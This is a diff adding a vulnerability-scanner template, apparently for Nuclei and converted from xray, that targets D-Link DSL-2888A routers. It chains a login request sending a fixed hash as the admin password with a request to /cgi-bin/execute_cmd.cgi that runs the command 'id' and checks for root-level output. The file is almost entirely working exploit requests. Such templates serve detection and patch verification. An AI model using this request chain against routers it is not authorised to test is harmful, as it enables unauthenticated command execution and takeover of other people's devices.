@@ -1,0 +1,48 @@
+id: poc-yaml-dlink-dsl-2888a-rce
+
+info:
+  name: poc-yaml-dlink-dsl-2888a-rce
+  author: mvhz81
+  severity: high
+  tags: xray-converted,rce,ct-146058
+  reference:
+    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/d-link-multiple-security-vulnerabilities-leading-to-rce/
+
+http:
+  - raw:
+      - |
+        GET /page/login/login.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+  - raw:
+      - |
+        GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid=0(admin) gid=0(admin)"
